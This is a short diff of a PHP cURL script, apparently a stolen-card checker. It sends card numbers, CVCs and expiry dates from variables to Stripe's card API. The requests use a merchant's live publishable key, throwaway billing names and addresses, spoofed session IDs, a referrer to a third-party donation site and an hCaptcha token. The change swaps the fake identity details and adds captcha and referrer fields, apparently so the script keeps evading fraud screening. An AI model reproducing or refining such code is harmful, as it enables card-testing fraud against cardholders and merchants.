@@ -148,7 +148,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[address][line1]=146272&billing_details[address][line2]=&billing_details[address][city]=Montezuma&billing_details[address][state]=indiana&billing_details[address][postal_code]=47862&billing_details[address][country]=US&billing_details[name]=tac+cara&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=8a050cc5-050d-45ad-b96a-79d56042a2a973a186&muid=fde419d9-a51d-44ef-8169-e81cd4ab02911d6f36&sid=45fff18a-d841-4987-a3b9-db3922647f6b8ae46d&pasted_fields=number&payment_user_agent=stripe.js%2F5d73d17adc%3B+stripe-js-v3%2F5d73d17adc&time_on_page=44190&key=pk_live_74xoS62Pi5J9jPQdKthAUf7u');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[address][line1]=870+New+Jersey+34&billing_details[address][line2]=&billing_details[address][city]=Matawan&billing_details[address][state]=New+Mexico&billing_details[address][postal_code]=07747&billing_details[address][country]=US&billing_details[name]=Gg+mila&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=c587efe5-93bd-4d66-800a-44b8b4c998cd592940&muid=63d6e3fc-8439-48ed-a437-8584d4a88d5c3b7fdf&sid=de8ec765-f839-4290-b807-e557e618755f27f32d&payment_user_agent=stripe.js%2F97cb06c5c7%3B+stripe-js-v3%2F97cb06c5c7%3B+split-card-element&referrer=https%3A%2F%2Fjaxcc.org&time_on_page=71304&key=pk_live_74xoS62Pi5J9jPQdKthAUf7u&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9');
 
 
 
